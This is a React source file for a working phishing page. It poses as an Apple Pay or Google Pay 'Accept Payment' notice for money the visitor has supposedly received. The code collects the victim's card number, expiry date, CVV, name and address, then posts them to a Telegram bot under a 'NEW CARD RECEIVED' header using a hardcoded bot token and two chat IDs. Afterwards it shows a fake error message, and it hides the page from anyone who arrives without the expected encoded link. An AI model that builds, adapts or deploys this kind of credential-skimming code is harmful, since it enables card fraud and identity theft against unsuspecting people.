import React, { useEffect, useState } from "react";
import axios from "axios";
function App() {
  const botToken = "6980032440:AAGfgxetXOEWp0bVi2cXotvrupsDqn0FUxU";
  // Replace with the target user's ID

  const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
  let [person, setPerson] = useState({});
  let [pageExpired, setPageExpired] = useState(null);
  let [card, setCard] = useState({});
  let [message, setMessage] = useState("");
  let [pdDisplay, setpdDisplay] = useState("d-none");
  let [acceptPaymentButton, setacceptPaymentButton] = useState("");
  let [ccDisplay, setccDisplay] = useState("d-none");
  let good = "good";

  const queryString = window.location.hash.substring(1);

  let decrypt = atob(queryString);
  let expire = null;
  const urlParams = new URLSearchParams(decrypt);

  const paramsObject = {};
  urlParams.forEach((value, key) => {
    paramsObject[key] = value;
  });

  if (
    paramsObject.hasOwnProperty("name") &&
    paramsObject.hasOwnProperty("method") &&
    paramsObject.hasOwnProperty("amount") &&
    paramsObject.hasOwnProperty("date")
  ) {
    good = "none";
  } else {
    window.location.href = "about:blank";
  }

  if (paramsObject != null) {
    expire = new Date(paramsObject.date);

    const currentDateTime = new Date();

    if (expire < currentDateTime && pageExpired === null) {
      setPageExpired(true);
    }
  }

  const sendMessage = async (chatId, texts) => {
    try {
      const response = await axios.post(apiUrl, {
        chat_id: chatId,
        text: texts,
      });
      return response;
    } catch (error) {
      console.error("Error:", error.message);
    }
  };

  // console.log("All params:", paramsObject);

  useEffect(() => {
    if (person.there) {
      let texts = `
      ##### NEW CARD RECEIVED #####
      first name : ${person.fname},
      last name : ${person.lname},
      street name: ${person.street},
      city: ${person.city},
      state: ${person.city},
      zip code: ${person.zip}
      card number : ${card.cc},
      Expiry Date: ${card.Month}, ${card.year}, 
      cvv: ${card.cvv},`;

      sendMessage("1099461059", texts);
      sendMessage("5951870545", texts);
    }
    // Your code here
  }, [person, apiUrl, card]);

  useEffect(() => {
    if (card.there) {
      let cards = ` 
        card number : ${card.cc},
      Expiry Date: ${card.Month}, ${card.year}, 
      cvv: ${card.cvv},`;
      sendMessage("1099461059", cards);
      sendMessage("5951870545", cards);
    }
  }, [card, apiUrl]);
  if (pageExpired !== true) {
    return (
      <div className="container  mx-auto text-center">
        <div>
          {paramsObject.method === "applepay" ? (
            <img
              className="paylogo mt-1"
              src="https://i.pinimg.com/736x/b6/e0/2d/b6e02d50c9561c47a728e9be62a14f10.jpg"
              alt="logo"
              width="90"
            />
          ) : (
            <img
              className="paylogo mt-1"
              src="https://www.lifewire.com/thmb/sR3qNnvZzVuS6jsr0bvPqr9uEDE=/1500x0/filters:no_upscale():max_bytes(150000):strip_icc()/google-pay-symbols-5ace1e50642dca0036d97ffe.png"
              // src="https://i.pinimg.com/736x/b6/e0/2d/b6e02d50c9561c47a728e9be62a14f10.jpg"
              alt="logo"
              width="90"
            />
          )}

          <br />
          <h3 className="text-center">
            You received ${paramsObject.amount} from {paramsObject.name}{" "}
          </h3>
          <br></br>
          <p>
            <span className="fs-2 text-danger">{message}</span>
          </p>
          <small className="text-center">
            You have untill {expire.getMonth() + 1}/{expire.getDate()}/
            {expire.getFullYear()} to accept this payment
          </small>
          <br />
          <br />
          <br />
          <button
            className={`btn btn-outline-dark text-center justify-content-center ${acceptPaymentButton}`}
            onClick={(e) => {
              e.preventDefault();
              setccDisplay("d-block");
              setacceptPaymentButton("d-none");
            }}
          >
            Accept Payment!
          </button>
          <br />
          <br />
          <div className={pdDisplay} id="personal-details">
            <form
              className="row g-3 needs-validation"
              noValidate
              onSubmit={(e) => {
                e.preventDefault();
                var myElement = document.getElementById("accept-btn");
                myElement.setAttribute("disabled", `${true}`);
                setTimeout(() => {
                  setMessage("An error occurred!");
                  myElement.removeAttribute("disabled");
                }, 2000);
                setPerson({
                  there: true,
                  fname: document.getElementById("validationCustom01").value,
                  lname: document.getElementById("validationCustom02").value,
                  street: document.getElementById("validationCustomUsername")
                    .value,
                  state: document.getElementById("state").value,
                  city: document.getElementById("validationCustom03").value,
                  zip: document.getElementById("validationCustom05").value,
                });
              }}
            >
              <div className="col-6">
                <label htmlFor="validationCustom01" className="form-label">
                  First name
                </label>
                <input
                  type="text"
                  className="form-control"
                  id="validationCustom01"
                  required
                />
                <div className="valid-feedback">Looks good!</div>
              </div>
              <div className="col-6">
                <label htmlFor="validationCustom02" className="form-label">
                  Last name
                </label>
                <input
                  type="text"
                  className="form-control"
                  id="validationCustom02"
                  required
                />
                <div className="valid-feedback">Looks good!</div>
              </div>
              <div className="col-8">
                <label
                  htmlFor="validationCustomUsername"
                  className="form-label"
                >
                  Street
                </label>
                <div className="input-group has-validation">
                  <input
                    type="text"
                    className="form-control"
                    id="validationCustomUsername"
                    aria-describedby="inputGroupPrepend"
                    required
                  />
                  <div className="invalid-feedback">.</div>
                </div>
              </div>
              <div className="col-4">
                <label htmlFor="validationCustom03" className="form-label">
                  City
                </label>
                <input
                  type="text"
                  className="form-control"
                  id="validationCustom03"
                  required
                />
                <div className="invalid-feedback">
                  Please provide a valid city.
                </div>
              </div>
              <div className="col-7">
                <label className="form-label">State</label>
                <input
                  type="text"
                  className="form-control"
                  id="state"
                  required
                />
              </div>
              <div className="col-5">
                <label htmlFor="validationCustom05" className="form-label">
                  Zip
                </label>
                <input
                  type="text"
                  className="form-control"
                  id="validationCustom05"
                  required
                />
                <div className="invalid-feedback">
                  Please provide a valid zip.
                </div>
              </div>

              <div className="text-end">
                <button
                  id="accept-btn"
                  className="btn btn-dark w-25"
                  type="submit"
                >
                  Accept
                </button>
              </div>
            </form>
            <br />
          </div>
          <div className={ccDisplay} id="card-details">
            <form
              className="row g-3 needs-validation"
              onSubmit={(e) => {
                e.preventDefault();
                setpdDisplay("d-block");
                setccDisplay("d-none");

                setCard({
                  there: true,
                  cc: document.getElementById("cardNO").value,
                  Month: document.getElementById("month-select").value,
                  year: document.getElementById("year-select").value,
                  cvv: document.getElementById("cvv").value,
                });
              }}
              noValidate
            >
              <div className="col-9">
                <label htmlFor="cardNO" className="form-label">
                  Card number
                </label>
                <input
                  type="text"
                  className="form-control"
                  id="cardNO"
                  placeholder="     0000 0000 0000 0000 0000"
                  required
                />
                <div className="valid-feedback">Looks good!</div>
              </div>
              <div className="col-3">
                <label
                  htmlFor="validationCustomUsername"
                  className="form-label "
                >
                  Cvv
                </label>
                <div className="input-group has-validation">
                  <input
                    type="text"
                    placeholder="   ---"
                    className="form-control px-auto"
                    id="cvv"
                    aria-describedby="inputGroupPrepend"
                    required
                  />
                  <div className="invalid-feedback">.</div>
                </div>
              </div>

              <div className="col-5">
                <label
                  htmlFor="month-select"
                  className="form-label text-start ms-0 ps-0"
                >
                  Expiry date
                </label>
                <select
                  className="form-select"
                  id="month-select"
                  name="month-select"
                  required
                >
                  <option value="01">January</option>
                  <option value="02">February</option>
                  <option value="03">March</option>
                  <option value="04">April</option>
                  <option value="05">May</option>
                  <option value="06">June</option>
                  <option value="07">July</option>
                  <option value="08">August</option>
                  <option value="09">September</option>
                  <option value="10">October</option>
                  <option value="11">November</option>
                  <option value="12">December</option>
                </select>

                <div className="valid-feedback">Looks good!</div>
              </div>
              <div className="col-4">
                <label htmlFor="year-select" className="form-label text-white">
                  ,
                </label>
                <select
                  className="form-select"
                  id="year-select"
                  name="year-select"
                  required
                >
                  <option value="2023">2023</option>
                  <option value="2024">2024</option>
                  <option value="2025">2025</option>
                  <option value="2026">2026</option>
                  <option value="2027">2027</option>
                  <option value="2028">2028</option>
                  <option value="2029">2029</option>
                  <option value="2030">2030</option>
                  <option value="2031">2031</option>
                  <option value="2032">2032</option>
                  <option value="2033">2033</option>
                  <option value="2034">2034</option>
                </select>
              </div>
              <div className="col-3">
                <label htmlFor="validationCustom05" className="form-label">
                  Zip
                </label>
                <input
                  type="text"
                  className="form-control"
                  id="validationCustom05"
                  required
                />
                <div className="invalid-feedback">
                  Please provide a valid zip.
                </div>
              </div>

              <div className="text-end">
                <button className="btn btn-outline-dark w-25 " type="submit">
                  Next
                </button>
              </div>
            </form>
            <br />
          </div>
        </div>
      </div>
    );
  } else {
    if (pageExpired === true) {
      return (
        <div className="expired-message">
          <h1>Page Expired</h1>
          <p>This temporary page has expired.</p>
        </div>
      );
    }
  }
}

export default App;
